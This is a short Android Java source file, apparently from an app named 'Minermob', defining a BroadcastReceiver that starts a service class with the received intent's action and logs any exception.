package minermob.service.c;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;


public class MRC extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            Intent service = new Intent(context, MBS.class);
            service.setAction(intent.getAction());
            context.startService(service);

        } catch (Exception e) {
            Log.d("Minermob", String.valueOf(e));
        }

    }


}
